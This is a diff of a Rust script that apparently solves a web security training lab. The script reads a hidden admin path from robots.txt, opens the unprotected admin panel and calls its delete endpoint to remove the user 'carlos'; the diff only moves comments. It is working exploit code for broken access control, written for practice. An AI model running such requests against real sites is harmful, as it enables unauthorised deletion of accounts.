@@ -37,18 +37,18 @@ fn main() {
     // build the client used in all subsequent requests
     let client = build_client();
 
+    // fetch /robots.txt file
     print!("{} ", "1. Fetching /robots.txt file..".white());
     io::stdout().flush();
-    // fetch /robots.txt file
     let get_robots = client
         .get(format!("{url}/robots.txt"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch /robots.txt file".red()));
     println!("{}", "OK".green());
 
+    // get the body of the response and extract the hidden name
     print!("{} ", "2. Extracting the hidden path..".white());
     io::stdout().flush();
-    // get the body of the response and extract the hidden name
     let body = get_robots.text().unwrap();
     let hidden_path = capture_pattern("Disallow: (.*)", &body).expect(&format!(
         "{}",
@@ -56,20 +56,20 @@ fn main() {
     ));
     println!("{} => {}", "OK".green(), hidden_path.yellow());
 
-    print!("{} ", "3. Fetching the admin panel..".white());
-    io::stdout().flush();
     // fetch the admin panel
     // this step in not necessary in the script, you can do step 4 directly
     // it's only a must when solving the lab using the browser
+    print!("{} ", "3. Fetching the admin panel..".white());
+    io::stdout().flush();
     let admin_panel = client
         .get(format!("{url}{hidden_path}"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));
     println!("{}", "OK".green());
 
+    // delete carlos
     print!("{} ", "4. Deleting carlos..".white());
     io::stdout().flush();
-    // delete carlos
     let delete_carlos = client
         .get(format!("{url}{hidden_path}/delete?username=carlos"))
         .send()
